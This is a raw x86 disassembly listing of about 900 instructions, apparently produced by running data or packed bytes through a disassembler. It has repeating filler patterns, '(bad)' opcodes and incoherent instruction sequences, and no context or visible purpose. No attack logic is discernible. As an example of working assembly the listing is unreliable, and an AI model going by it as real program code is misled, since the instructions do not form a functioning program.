  40c81c:	bound  eax,QWORD PTR [eax+0x43]
  40c81f:	inc    eax
  40c820:	adc    BYTE PTR [eax-0x41],bl
  40c823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c824:	inc    eax
  40c825:	xor    esi,DWORD PTR [edx]
  40c827:	mov    dl,0xa8
  40c829:	mov    bh,0x5
  40c82b:	test   DWORD PTR [eax-0x37],eax
  40c82e:	push   ebx
  40c82f:	cld    
  40c830:	adc    ebp,eax
  40c832:	inc    edx
  40c833:	out    dx,eax
  40c834:	inc    eax
  40c835:	je     0x40c7e8
  40c837:	data16 and BYTE PTR [edx+0x43414061],0x40
  40c83f:	add    eax,0x43406262
  40c844:	inc    ecx
  40c845:	adc    BYTE PTR [eax],al
  40c847:	inc    eax
  40c848:	add    eax,0x43000562
  40c84d:	add    BYTE PTR [ecx+0x40],al
  40c850:	inc    eax
  40c851:	add    eax,0x400062
  40c856:	inc    ebx
  40c857:	inc    eax
  40c858:	js     0x40c89b
  40c85a:	inc    ecx
  40c85b:	bound  eax,QWORD PTR [eax-0x5d]
  40c85e:	inc    eax
  40c85f:	scas   eax,DWORD PTR es:[edi]
  40c860:	pop    eax
  40c861:	dec    esp
  40c862:	or     eax,0xd728d8a8
  40c867:	cmp    dh,cl
  40c869:	mov    esp,0x42b411cd
  40c86e:	mov    ds:0x10721b1d,al
  40c873:	dec    eax
  40c874:	bound  eax,QWORD PTR [eax+0x5]
  40c877:	inc    ecx
  40c878:	add    BYTE PTR [ebx+0x40],al
  40c87b:	inc    eax
  40c87c:	inc    ecx
  40c87d:	inc    eax
  40c87e:	inc    eax
  40c87f:	bound  eax,QWORD PTR ds:0x5624300
  40c885:	add    BYTE PTR [eax+0x40],al
  40c888:	add    BYTE PTR [ecx+0x43],al
  40c88b:	add    BYTE PTR [eax+0x41],al
  40c88e:	add    eax,0x40436200
  40c893:	inc    eax
  40c894:	add    eax,0xe7043562
  40c899:	push   ecx
  40c89a:	cmp    al,BYTE PTR [ecx-0x44]
  40c89d:	inc    ecx
  40c89e:	pop    es
  40c89f:	push   esp
  40c8a0:	xor    eax,0x58cb94d
  40c8a5:	or     BYTE PTR [edx+0x62],dh
  40c8a8:	sub    eax,0xcd630751
  40c8ad:	cld    
  40c8ae:	bound  eax,QWORD PTR [ebx-0x72]
  40c8b1:	cmp    al,dl
  40c8b3:	test   al,0x40
  40c8b5:	iret   
  40c8b6:	push   ecx
  40c8b7:	fadd   QWORD PTR [ecx+0x2a113453]
  40c8bd:	pop    eax
  40c8be:	retf   0x776b
  40c8c1:	fs jp  0x40c878
  40c8c4:	push   edx
  40c8c5:	bound  esi,QWORD PTR [eax+0x309152ae]
  40c8cb:	or     eax,0x404101ab
  40c8d0:	add    eax,0x41624340
  40c8d5:	test   BYTE PTR [eax],al
  40c8d7:	and    eax,0x404043
  40c8dc:	add    BYTE PTR ds:0x626210,al
  40c8e2:	add    eax,0x43404140
  40c8e7:	inc    eax
  40c8e8:	inc    ecx
  40c8e9:	add    eax,0x10664062
  40c8ee:	inc    ebx
  40c8ef:	bound  ecx,QWORD PTR ds:0xe7cd4bd
  40c8f5:	inc    edx
  40c8f6:	dec    esp
  40c8f7:	add    bl,cl
  40c8f9:	fsub   QWORD PTR [ebx+esi*4+0x17]
  40c8fd:	push   esp
  40c8fe:	test   BYTE PTR [esp+edi*2-0x16],ah
  40c902:	sub    al,BYTE PTR [edi+0x19]
  40c905:	test   bl,al
  40c907:	adc    BYTE PTR [ebx+0x2f],al
  40c90a:	xchg   esi,eax
  40c90b:	push   ebp
  40c90c:	inc    ecx
  40c90d:	outs   dx,DWORD PTR ds:[esi]
  40c90e:	mov    edi,0xd9db2558
  40c913:	push   edi
  40c914:	jg     0x40c8be
  40c916:	mov    edi,0x6f24108c
  40c91b:	mov    bh,0x9
  40c91d:	adc    BYTE PTR [edi-0x3cbc9c42],al
  40c923:	aas    
  40c924:	pop    ds
  40c925:	mov    esp,0x4041cc05
  40c92a:	add    BYTE PTR [eax],al
  40c92c:	add    BYTE PTR [eax+0x40],al
  40c92f:	inc    ebx
  40c930:	bound  eax,QWORD PTR [eax]
  40c932:	inc    eax
  40c933:	inc    eax
  40c934:	add    eax,0x62434162
  40c939:	inc    eax
  40c93a:	js     0x40c94c
  40c93c:	inc    ecx
  40c93d:	add    eax,0x5404325
  40c942:	bound  eax,QWORD PTR [eax+0x40]
  40c945:	inc    ecx
  40c946:	inc    ebx
  40c947:	sahf   
  40c948:	arpl   WORD PTR [eax-0x68ead4cd],di
  40c94e:	inc    ecx
  40c94f:	test   al,0x54
  40c951:	add    BYTE PTR [eax-0x4bf66cc1],ch
  40c957:	adc    cl,BYTE PTR [eax+0x466940c1]
  40c95d:	pop    ds
  40c95e:	inc    esp
  40c95f:	shr    BYTE PTR [edx+edi*8+0x31],0x68
  40c964:	icebp  
  40c965:	int3   
  40c966:	adc    ax,0xe85f
  40c96a:	ins    BYTE PTR es:[edi],dx
  40c96b:	outs   dx,DWORD PTR ds:[esi]
  40c96c:	adc    bh,BYTE PTR [edi-0x15]
  40c96f:	int    0x84
  40c971:	arpl   WORD PTR [edx-0x1f],bx
  40c974:	jne    0x40c9a9
  40c976:	test   al,0x11
  40c978:	or     ecx,0x43
  40c97b:	fst    DWORD PTR [esi+0x1f]
  40c97e:	and    eax,0x436241
  40c983:	adc    BYTE PTR [eax+0x0],al
  40c986:	add    eax,0x62410040
  40c98b:	inc    eax
  40c98c:	add    BYTE PTR [ebx-0x34],al
  40c98f:	inc    eax
  40c990:	add    eax,0x78434040
  40c995:	bound  eax,QWORD PTR [ecx+0x78]
  40c998:	add    eax,0x62404043
  40c99d:	adc    bh,BYTE PTR [ebx+edx*4-0x6e3e2e04]
  40c9a4:	dec    ecx
  40c9a5:	mov    eax,0x3ef9770d
  40c9aa:	xchg   DWORD PTR ds:0x5acd41b7,ecx
  40c9b0:	bound  esp,QWORD PTR [edx-0x76]
  40c9b3:	adc    eax,0x6240fc2d
  40c9b8:	add    BYTE PTR [edx+0x26],ch
  40c9bb:	push   eax
  40c9bc:	fldcw  WORD PTR [eax+0x2a]
  40c9bf:	inc    ecx
  40c9c0:	inc    eax
  40c9c1:	add    eax,0x43436240
  40c9c6:	add    eax,0x62004040
  40c9cb:	inc    eax
  40c9cc:	add    BYTE PTR [ecx+0x40],al
  40c9cf:	inc    ebx
  40c9d0:	test   BYTE PTR ds:0x58054041,ah
  40c9d6:	inc    eax
  40c9d7:	inc    eax
  40c9d8:	bound  eax,QWORD PTR [eax+0x66]
  40c9db:	inc    ecx
  40c9dc:	inc    eax
  40c9dd:	add    eax,0x74c08f00
  40c9e2:	sar    DWORD PTR fs:[eax],1
  40c9e5:	addr16 push esp
  40c9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9e8:	pop    ss
  40c9e9:	inc    ecx
  40c9ea:	scas   al,BYTE PTR es:[edi]
  40c9eb:	ins    DWORD PTR es:[edi],dx
  40c9ec:	call   DWORD PTR [ebx+0x36]
  40c9ef:	push   ebp
  40c9f0:	xor    al,0x43
  40c9f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f3:	icebp  
  40c9f4:	push   edx
  40c9f5:	add    BYTE PTR [eax],al
  40c9f7:	inc    ebx
  40c9f8:	inc    eax
  40c9f9:	bound  eax,QWORD PTR ds:0x25404110
  40c9ff:	add    ah,cl
  40ca01:	inc    ebx
  40ca02:	add    eax,0x40402562
  40ca07:	add    BYTE PTR [eax+0x40],al
  40ca0a:	inc    ecx
  40ca0b:	inc    ecx
  40ca0c:	add    eax,0x78434025
  40ca11:	bound  eax,QWORD PTR [eax-0x7c]
  40ca14:	inc    eax
  40ca15:	inc    ecx
  40ca16:	daa    
  40ca17:	inc    ebp
  40ca18:	xchg   DWORD PTR [edx+0x30],esp
  40ca1b:	cli    
  40ca1c:	inc    esp
  40ca1d:	aas    
  40ca1e:	cmp    eax,0xa4d66740
  40ca23:	lods   al,BYTE PTR ds:[esi]
  40ca24:	jno    0x40ca6d
  40ca26:	retf   
  40ca27:	inc    eax
  40ca28:	sub    DWORD PTR [ebp+0x40],esp
  40ca2b:	sub    eax,0x40c0f8bf
  40ca30:	bound  ebx,QWORD PTR [ecx+0x31]
  40ca33:	sbb    DWORD PTR [eax-0x41],ecx
  40ca36:	arpl   sp,sp
  40ca38:	inc    ecx
  40ca39:	fadd   QWORD PTR [ecx+0x40]
  40ca3c:	inc    eax
  40ca3d:	inc    ebx
  40ca3e:	int3   
  40ca3f:	add    BYTE PTR ds:0x56240,al
  40ca45:	inc    ebx
  40ca46:	inc    eax
  40ca47:	inc    eax
  40ca48:	add    BYTE PTR [ecx+0x62],al
  40ca4b:	bound  eax,QWORD PTR [eax]
  40ca4d:	int3   
  40ca4e:	inc    eax
  40ca4f:	inc    ebx
  40ca50:	add    eax,0x43624041
  40ca55:	adc    BYTE PTR [ecx+0x5],al
  40ca58:	inc    eax
  40ca59:	ins    BYTE PTR es:[edi],dx
  40ca5a:	fs jb  0x40ca63
  40ca5d:	sar    al,cl
  40ca5f:	xchg   DWORD PTR [edi+esi*2],ecx
  40ca62:	pop    es
  40ca63:	mov    eax,ds:0x5cc3c548
  40ca68:	add    eax,DWORD PTR [ebx-0x5d]
  40ca6b:	push   ebp
  40ca6c:	mov    al,0x25
  40ca6e:	mov    edi,0xd7d1000d
  40ca73:	xchg   ecx,eax
  40ca74:	je     0x40cae0
  40ca76:	mov    edi,0xe199c2cb
  40ca7b:	bound  eax,QWORD PTR [ebx+0x40]
  40ca7e:	adc    BYTE PTR ds:0x4158cc40,al
  40ca84:	inc    ebx
  40ca85:	bound  eax,QWORD PTR [ecx+0x40]
  40ca88:	add    eax,0x4140
  40ca8d:	and    eax,0x40400062
  40ca92:	add    eax,0x84404340
  40ca97:	int3   
  40ca98:	js     0x40ca9a
  40ca9a:	inc    ecx
  40ca9b:	adc    BYTE PTR [edx+0xf],ah
  40ca9e:	xor    eax,0x499d1040
  40caa3:	sub    al,0x76
  40caa5:	or     dh,dh
  40caa7:	push   ecx
  40caa8:	mov    eax,0x43433516
  40caad:	das    
  40caae:	daa    
  40caaf:	dec    eax
  40cab0:	shr    DWORD PTR [eax-0x6c7742bf],0xe
  40cab7:	mov    edi,0x67b0406a
  40cabc:	inc    ecx
  40cabd:	push   esp
  40cabe:	adc    DWORD PTR [edx],eax
  40cac0:	bound  esi,QWORD PTR [edx+0x2e43b43d]
  40cac6:	push   esi
  40cac7:	mov    cl,0x7c
  40cac9:	add    eax,0x33004c3
  40cace:	push   ecx
  40cacf:	unpcklps xmm0,XMMWORD PTR [esi+0x40414000]
  40cad6:	inc    ebx
  40cad7:	bound  ax,DWORD PTR ds:0x40434100
  40cade:	add    eax,0x40054062
  40cae3:	bound  eax,QWORD PTR [ecx+0x40]
  40cae6:	inc    ebx
  40cae7:	inc    eax
  40cae8:	add    eax,0x25405841
  40caed:	bound  eax,QWORD PTR [eax+0x43]
  40caf0:	inc    eax
  40caf1:	adc    BYTE PTR [edi+0x3d],cl
  40caf4:	mov    al,ds:0x35730be7
  40caf9:	imul   esi,DWORD PTR [edx+eiz*2],0x3b54c40
  40cb00:	loope  0x40cab3
  40cb02:	inc    eax
  40cb03:	dec    edi
  40cb04:	xor    DWORD PTR [edi+esi*8],ebp
  40cb07:	aas    
  40cb08:	inc    eax
  40cb09:	inc    ecx
  40cb0a:	inc    ebx
  40cb0b:	inc    eax
  40cb0c:	add    eax,0x43406262
  40cb11:	inc    ecx
  40cb12:	adc    BYTE PTR [eax],al
  40cb14:	inc    eax
  40cb15:	add    eax,0x43000562
  40cb1a:	add    BYTE PTR [ecx+0x40],al
  40cb1d:	inc    eax
  40cb1e:	add    eax,0x400062
  40cb23:	inc    ebx
  40cb24:	inc    eax
  40cb25:	js     0x40cb68
  40cb27:	inc    ecx
  40cb28:	bound  eax,QWORD PTR [eax-0x4c]
  40cb2b:	add    eax,0xf16cdc5c
  40cb30:	fs pop ds
  40cb32:	arpl   WORD PTR [esi-0x7aebbdb4],ax
  40cb38:	xchg   ecx,eax
  40cb39:	(bad)  
  40cb3a:	push   DWORD PTR [edx-0x4a]
  40cb3d:	inc    esp
  40cb3e:	inc    edi
  40cb3f:	dec    esp
  40cb40:	add    edx,DWORD PTR [ecx-0x58]
  40cb43:	mov    al,0x4
  40cb45:	ins    BYTE PTR es:[edi],dx
  40cb46:	lds    esp,FWORD PTR [edx+0x33]
  40cb49:	outs   dx,DWORD PTR ds:[esi]
  40cb4a:	jae    0x40cb51
  40cb4c:	(bad)  
  40cb4d:	out    dx,al
  40cb4e:	sti    
  40cb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb50:	jbe    0x40cb05
  40cb52:	ret    0xb486
  40cb55:	bound  eax,QWORD PTR [eax+0x5]
  40cb58:	inc    ecx
  40cb59:	add    BYTE PTR [ebx+0x40],al
  40cb5c:	inc    eax
  40cb5d:	inc    ecx
  40cb5e:	inc    eax
  40cb5f:	inc    eax
  40cb60:	bound  eax,QWORD PTR ds:0x5624300
  40cb66:	add    BYTE PTR [eax+0x40],al
  40cb69:	add    BYTE PTR [ecx+0x43],al
  40cb6c:	add    BYTE PTR [eax+0x41],al
  40cb6f:	add    eax,0x40436200
  40cb74:	inc    eax
  40cb75:	add    eax,0xd396062
  40cb7a:	xchg   ebx,eax
  40cb7b:	push   0xd52c6e64
  40cb80:	mov    DWORD PTR [edx+0xd],esp
  40cb83:	push   ebx
  40cb84:	in     eax,0xaf
  40cb86:	adc    eax,0xf3401a42
  40cb8b:	inc    edi
  40cb8c:	js     0x40cb93
  40cb8e:	bound  eax,QWORD PTR [ecx+eax*2-0x3]
  40cb92:	sbb    DWORD PTR [ecx+0x62],esi
  40cb95:	xchg   bl,cl
  40cb97:	jbe    0x40cbdc
  40cb99:	inc    edx
  40cb9a:	xchg   ebx,eax
  40cb9b:	js     0x40cbe2
  40cb9d:	jne    0x40cc03
  40cb9f:	inc    ecx
  40cba0:	inc    eax
  40cba1:	add    eax,0x41624340
  40cba6:	test   BYTE PTR [eax],al
  40cba8:	and    eax,0x404043
  40cbad:	add    BYTE PTR ds:0x626210,al
  40cbb3:	add    eax,0x43404140
  40cbb8:	inc    eax
  40cbb9:	inc    ecx
  40cbba:	add    eax,0x10664062
  40cbbf:	inc    ebx
  40cbc0:	(bad)  
  40cbc1:	div    DWORD PTR [eax]
  40cbc3:	out    0x4b,al
  40cbc5:	mov    cl,0xac
  40cbc7:	scas   al,BYTE PTR es:[edi]
  40cbc8:	xor    eax,0x59df9c4f
  40cbcd:	jo     0x40cc3b
  40cbcf:	add    eax,0x83404407
  40cbd4:	or     eax,0x2f862cf9
  40cbd9:	pop    ebp
  40cbda:	xor    DWORD PTR [ebp+0x38],esi
  40cbdd:	dec    ecx
  40cbde:	or     BYTE PTR [eax+0x5],ah
  40cbe1:	int3   
  40cbe2:	inc    ecx
  40cbe3:	inc    eax
  40cbe4:	add    BYTE PTR [eax],al
  40cbe6:	add    BYTE PTR [eax+0x40],al
  40cbe9:	inc    ebx
  40cbea:	bound  eax,QWORD PTR [eax]
  40cbec:	inc    eax
  40cbed:	inc    eax
  40cbee:	add    eax,0x62434162
  40cbf3:	inc    eax
  40cbf4:	js     0x40cc06
  40cbf6:	inc    ecx
  40cbf7:	add    eax,0x5404325
  40cbfc:	bound  eax,QWORD PTR [eax+0x40]
  40cbff:	inc    ecx
  40cc00:	inc    ebx
  40cc01:	bound  ebx,QWORD PTR [edi-0x4e562194]
  40cc07:	fldcw  WORD PTR [ebp+0x6231533d]
  40cc0d:	mov    esi,0x840557de
  40cc12:	mov    eax,ds:0x552cbb4e
  40cc17:	mov    bl,0x86
  40cc19:	bound  ebp,QWORD PTR [eax-0x408ee013]
  40cc1f:	test   al,0x14
  40cc21:	dec    ebx
  40cc22:	adc    bh,BYTE PTR [esi+0x486e4b3f]
  40cc28:	lods   al,BYTE PTR ds:[esi]
  40cc29:	les    edi,FWORD PTR [esi+0x7373c933]
  40cc2f:	push   edx
  40cc30:	add    eax,0xacf5156c
  40cc35:	pop    esp
  40cc36:	imul   sp,WORD PTR ds:0x436241,0x4010
  40cc3f:	add    BYTE PTR ds:0x62410040,al
  40cc45:	inc    eax
  40cc46:	add    BYTE PTR [ebx-0x34],al
  40cc49:	inc    eax
  40cc4a:	add    eax,0x78434040
  40cc4f:	bound  eax,QWORD PTR [ecx+0x78]
  40cc52:	add    eax,0x62404043
  40cc57:	xchg   BYTE PTR [eax-0x4a27bc09],ch
  40cc5d:	fld    DWORD PTR [ecx+0x3343210e]
  40cc63:	jmp    0x40ccb1
  40cc65:	mov    sp,0x26ab
  40cc69:	push   eax
  40cc6a:	cwde   
  40cc6b:	jle    0x40cc9f
  40cc6d:	fild   QWORD PTR [ebp+0x5]
  40cc70:	adc    al,BYTE PTR [eax+eax*2-0x23da91aa]
  40cc77:	xchg   BYTE PTR [esi+edi*4+0x31],dl
  40cc7b:	inc    ecx
  40cc7c:	inc    eax
  40cc7d:	add    eax,0x43436240
  40cc82:	add    eax,0x62004040
  40cc87:	inc    eax
  40cc88:	add    BYTE PTR [ecx+0x40],al
  40cc8b:	inc    ebx
  40cc8c:	test   BYTE PTR ds:0x58054041,ah
  40cc92:	inc    eax
  40cc93:	inc    eax
  40cc94:	bound  eax,QWORD PTR [eax+0x66]
  40cc97:	inc    ecx
  40cc98:	inc    eax
  40cc99:	add    eax,0xb248d700
  40cc9e:	lahf   
  40cc9f:	pusha  
  40cca0:	adc    eax,0x50d66c0d
  40cca5:	pop    es
  40cca6:	shr    BYTE PTR [edx+0x1dcec9cb],0x2d
  40ccad:	add    esp,DWORD PTR [edi+0x5]
  40ccb0:	adc    DWORD PTR [esi],esp
  40ccb2:	inc    ebx
  40ccb3:	jecxz  0x40ccfa
  40ccb5:	adc    DWORD PTR [ecx],eax
  40ccb7:	xchg   BYTE PTR [eax+ecx*2+0x40f295d1],cl
  40ccbe:	lods   al,BYTE PTR ds:[esi]
  40ccbf:	xor    ecx,DWORD PTR ds:0x4e72cb
  40ccc5:	add    BYTE PTR [ebx+0x40],al
  40ccc8:	bound  eax,QWORD PTR ds:0x25404110
  40ccce:	add    ah,cl
  40ccd0:	inc    ebx
  40ccd1:	add    eax,0x40402562
  40ccd6:	add    BYTE PTR [eax+0x40],al
  40ccd9:	inc    ecx
  40ccda:	inc    ecx
  40ccdb:	add    eax,0x78434025
  40cce0:	bound  eax,QWORD PTR [eax-0x7c]
  40cce3:	inc    eax
  40cce4:	inc    ecx
  40cce5:	mov    ch,0x51
  40cce7:	push   eax
  40cce8:	test   eax,0xc70d26cd
  40cced:	outs   dx,BYTE PTR ds:[esi]
  40ccee:	dec    ecx
  40ccef:	ret    0x4005
  40ccf2:	mov    ah,0xda
  40ccf4:	jnp    0x40cd3b
  40ccf6:	fistp  QWORD PTR [edi+0x40414686]
  40ccfc:	inc    eax
  40ccfd:	inc    ebx
  40ccfe:	int3   
  40ccff:	add    BYTE PTR ds:0x56240,al
  40cd05:	inc    ebx
  40cd06:	inc    eax
  40cd07:	inc    eax
  40cd08:	add    BYTE PTR [ecx+0x62],al
  40cd0b:	bound  eax,QWORD PTR [eax]
  40cd0d:	int3   
  40cd0e:	inc    eax
  40cd0f:	inc    ebx
  40cd10:	add    eax,0x43624041
  40cd15:	adc    BYTE PTR [ecx+0x5],al
  40cd18:	inc    eax
  40cd19:	add    eax,0xb79b4769
  40cd1e:	bound  esi,QWORD PTR [edi]
  40cd20:	gs retf 
  40cd22:	inc    ecx
  40cd23:	outs   dx,BYTE PTR ds:[esi]
  40cd24:	inc    edx
  40cd25:	add    DWORD PTR [ebx-0x58],eax
  40cd28:	enter  0x437d,0x7b
  40cd2c:	mov    bl,0xd2
  40cd2e:	rol    BYTE PTR ds:0x6230486e,1
  40cd34:	inc    ebx
  40cd35:	inc    eax
  40cd36:	adc    BYTE PTR ds:0x4158cc40,al
  40cd3c:	inc    ebx
  40cd3d:	bound  eax,QWORD PTR [ecx+0x40]
  40cd40:	add    eax,0x4140
  40cd45:	and    eax,0x40400062
  40cd4a:	add    eax,0x84404340
  40cd4f:	int3   
  40cd50:	js     0x40cd52
  40cd52:	inc    ecx
  40cd53:	adc    BYTE PTR [edx+0xf],ah
  40cd56:	stos   BYTE PTR es:[edi],al
  40cd57:	inc    ecx
  40cd58:	daa    
  40cd59:	push   0xffffff86
  40cd5b:	js     0x40cd9e
  40cd5d:	xchg   esp,eax
  40cd5e:	xor    dl,BYTE PTR [eax+0x67]
  40cd61:	pop    esi
  40cd62:	das    
  40cd63:	push   ebx
  40cd64:	mov    esp,0xf3338b40
  40cd69:	and    BYTE PTR [edi+0x31786e],0x40
  40cd70:	inc    ecx
  40cd71:	inc    eax
  40cd72:	inc    ebx
  40cd73:	bound  ax,DWORD PTR ds:0x40434100
  40cd7a:	add    eax,0x40054062
  40cd7f:	bound  eax,QWORD PTR [ecx+0x40]
  40cd82:	inc    ebx
  40cd83:	inc    eax
  40cd84:	add    eax,0x25405841
  40cd89:	bound  eax,QWORD PTR [eax+0x43]
  40cd8c:	inc    eax
  40cd8d:	adc    BYTE PTR [edx+0x41],dh
  40cd90:	inc    ecx
  40cd91:	add    al,BYTE PTR ds:0x66c18f8
  40cd97:	cmp    esi,DWORD PTR [ecx]
  40cd99:	xchg   ecx,eax
  40cd9a:	xchg   BYTE PTR [edi+ecx*2-0x15],ah
  40cd9e:	test   al,0x42
  40cda0:	sub    ch,BYTE PTR [ebp+0x24]
  40cda3:	push   0x105a43dd
  40cda8:	xor    esi,ebx
  40cdaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdab:	nop
  40cdac:	push   ds
  40cdad:	shr    DWORD PTR [ecx+0x5915b27],1
  40cdb3:	push   esp
  40cdb4:	inc    ecx
  40cdb5:	mov    ebp,eax
  40cdb7:	inc    eax
  40cdb8:	inc    ecx
  40cdb9:	inc    ebx
  40cdba:	inc    eax
  40cdbb:	add    eax,0x43406262
  40cdc0:	inc    ecx
  40cdc1:	adc    BYTE PTR [eax],al
  40cdc3:	inc    eax
  40cdc4:	add    eax,0x43000562
  40cdc9:	add    BYTE PTR [ecx+0x40],al
  40cdcc:	inc    eax
  40cdcd:	add    eax,0x400062
  40cdd2:	inc    ebx
  40cdd3:	inc    eax
  40cdd4:	js     0x40ce17
  40cdd6:	inc    ecx
  40cdd7:	bound  eax,QWORD PTR [eax+0x36]
  40cdda:	xor    esp,edx
  40cddc:	xchg   BYTE PTR [ebp+edi*4+0x4041a6b2],al
  40cde3:	push   cs
  40cde4:	cs inc esi
  40cde6:	imul   edx,DWORD PTR [eax+0x3b],0x71
  40cdea:	jo     0x40ce48
  40cdec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cded:	push   eax
  40cdee:	pop    edi
  40cdef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf0:	test   DWORD PTR [eax],ebp
  40cdf2:	xor    al,0x54
  40cdf4:	add    eax,0x5e41fc15
  40cdf9:	push   ecx
  40cdfa:	(bad)  
  40cdfb:	sbb    DWORD PTR [edx+0x40],esp
  40cdfe:	add    eax,0x40430041
  40ce03:	inc    eax
  40ce04:	inc    ecx
  40ce05:	inc    eax
  40ce06:	inc    eax
  40ce07:	bound  eax,QWORD PTR ds:0x5624300
  40ce0d:	add    BYTE PTR [eax+0x40],al
  40ce10:	add    BYTE PTR [ecx+0x43],al
  40ce13:	add    BYTE PTR [eax+0x41],al
  40ce16:	add    eax,0x40436200
  40ce1b:	inc    eax
  40ce1c:	add    eax,0x60c98662
  40ce21:	inc    ebx
  40ce22:	sbb    cl,BYTE PTR [esi+0x65]
  40ce25:	sbb    al,0x29
  40ce27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce28:	and    BYTE PTR [eax],dh
  40ce2a:	mov    edx,DWORD PTR [edx+0x15a46392]
  40ce30:	jl     0x40cdc2
  40ce32:	bound  ebp,QWORD PTR [edx]
  40ce34:	or     DWORD PTR [ebp+0x40ac4105],eax
  40ce3a:	pop    es
  40ce3b:	inc    ecx
  40ce3c:	inc    eax
  40ce3d:	add    eax,0x41624340
  40ce42:	test   BYTE PTR [eax],al
  40ce44:	and    eax,0x404043
  40ce49:	add    BYTE PTR ds:0x626210,al
  40ce4f:	add    eax,0x43404140
  40ce54:	inc    eax
  40ce55:	inc    ecx
  40ce56:	add    eax,0x10664062
  40ce5b:	inc    ebx
  40ce5c:	bound  eax,QWORD PTR [edx]
  40ce5e:	imul   edx,esp,0x31645486
  40ce64:	jg     0x40ced9
  40ce66:	xlat   BYTE PTR ds:[ebx]
  40ce67:	inc    edx
  40ce68:	pop    ss
  40ce69:	test   BYTE PTR [eax+0x6c],ah
  40ce6c:	loop   0x40ceb0
  40ce6e:	sbb    al,0xd0
  40ce70:	mov    ds:0xd188ec4c,eax
  40ce75:	mov    ah,0x36
  40ce77:	push   ecx
  40ce78:	add    eax,0x6a43f050
  40ce7d:	outs   dx,BYTE PTR ds:[esi]
  40ce7e:	inc    ebx
  40ce7f:	inc    edx
  40ce80:	xchg   BYTE PTR [edi-0x33fa2ebc],al
  40ce86:	inc    ecx
  40ce87:	inc    eax
  40ce88:	add    BYTE PTR [eax],al
  40ce8a:	add    BYTE PTR [eax+0x40],al
  40ce8d:	inc    ebx
  40ce8e:	bound  eax,QWORD PTR [eax]
  40ce90:	inc    eax
  40ce91:	inc    eax
  40ce92:	add    eax,0x62434162
  40ce97:	inc    eax
  40ce98:	js     0x40ceaa
  40ce9a:	inc    ecx
  40ce9b:	add    eax,0x5404325
  40cea0:	bound  eax,QWORD PTR [eax+0x40]
  40cea3:	inc    ecx
  40cea4:	inc    ebx
  40cea5:	mov    ds:0x60d11f40,al
  40ceaa:	xchg   ecx,eax
  40ceab:	dec    ebp
  40ceac:	fld    QWORD PTR [esi]
  40ceae:	push   edx
  40ceaf:	aaa    
  40ceb0:	jecxz  0x40ce54
  40ceb2:	push   ss
  40ceb3:	imul   esi,DWORD PTR [ebp+0x3a],0x534d1ad
  40ceba:	mov    ah,BYTE PTR ds:0x436241
  40cec0:	adc    BYTE PTR [eax+0x0],al
  40cec3:	add    eax,0x62410040
  40cec8:	inc    eax
  40cec9:	add    BYTE PTR [ebx-0x34],al
  40cecc:	inc    eax
  40cecd:	add    eax,0x78434040
  40ced2:	bound  eax,QWORD PTR [ecx+0x78]
  40ced5:	add    eax,0x62404043
  40ceda:	xor    eax,0xd737a1b9
  40cedf:	xchg   ecx,eax
  40cee0:	xchg   BYTE PTR [ebx+0x60],ah
  40cee3:	arpl   WORD PTR [ecx+0x40],ax
  40cee6:	inc    esi
  40cee7:	jge    0x40cf64
  40cee9:	pop    ss
  40ceea:	in     eax,dx
  40ceeb:	inc    ecx
  40ceec:	mov    dl,0x50
  40ceee:	pop    edx
  40ceef:	shl    DWORD PTR [ecx+0x40054041],1
  40cef5:	bound  eax,QWORD PTR [ebx+0x43]
  40cef8:	add    eax,0x62004040
  40cefd:	inc    eax
  40cefe:	add    BYTE PTR [ecx+0x40],al
  40cf01:	inc    ebx
  40cf02:	test   BYTE PTR ds:0x58054041,ah
  40cf08:	inc    eax
  40cf09:	inc    eax
  40cf0a:	bound  eax,QWORD PTR [eax+0x66]
  40cf0d:	inc    ecx
  40cf0e:	inc    eax
  40cf0f:	add    eax,0x4374f800
  40cf14:	sub    BYTE PTR [edi-0x5],ch
  40cf17:	arpl   WORD PTR ds:0x96304462,ax
  40cf1d:	inc    eax
  40cf1e:	add    ah,BYTE PTR [eax-0x7a]
  40cf21:	aaa    
  40cf22:	dec    ebp
  40cf23:	mov    WORD PTR [ecx],?
  40cf25:	lock xlat BYTE PTR ds:[ebx]
  40cf27:	cwde   
  40cf28:	jo     0x40cef0
  40cf2a:	addr16 inc esp
  40cf2c:	ja     0x40cf5e
  40cf2e:	xchg   ebp,eax
  40cf2f:	bound  esp,QWORD PTR [eax+0x6b5180a8]
  40cf35:	inc    eax
  40cf36:	pop    ebp
  40cf37:	mov    dh,0x5
  40cf39:	adc    dh,bh
  40cf3b:	imul   edi,DWORD PTR [edi],0x50
  40cf3e:	jae    0x40cfa6
  40cf40:	xchg   BYTE PTR [edi+ecx*2+0x345aaf],ah
  40cf47:	add    BYTE PTR [ebx+0x40],al
  40cf4a:	bound  eax,QWORD PTR ds:0x25404110
  40cf50:	add    ah,cl
  40cf52:	inc    ebx
  40cf53:	add    eax,0x40402562
  40cf58:	add    BYTE PTR [eax+0x40],al
  40cf5b:	inc    ecx
  40cf5c:	inc    ecx
  40cf5d:	add    eax,0x78434025
  40cf62:	bound  eax,QWORD PTR [eax-0x7c]
  40cf65:	inc    eax
  40cf66:	inc    ecx
  40cf67:	shl    BYTE PTR [edi],1
  40cf69:	outs   dx,BYTE PTR ds:[esi]
  40cf6a:	add    eax,0x12a6a566
  40cf6f:	mov    bh,0xda
  40cf71:	lahf   
  40cf72:	int    0xc3
  40cf74:	inc    ebx
  40cf75:	xchg   edx,eax
  40cf76:	repnz dec edx
  40cf78:	lea    eax,ds:0x41d21744
  40cf7e:	inc    eax
  40cf7f:	inc    eax
  40cf80:	inc    ebx
  40cf81:	int3   
  40cf82:	add    BYTE PTR ds:0x56240,al
  40cf88:	inc    ebx
  40cf89:	inc    eax
  40cf8a:	inc    eax
  40cf8b:	add    BYTE PTR [ecx+0x62],al
  40cf8e:	bound  eax,QWORD PTR [eax]
  40cf90:	int3   
  40cf91:	inc    eax
  40cf92:	inc    ebx
  40cf93:	add    eax,0x43624041
  40cf98:	adc    BYTE PTR [ecx+0x5],al
  40cf9b:	inc    eax
  40cf9c:	add    BYTE PTR ds:0x6c8600b4,dl
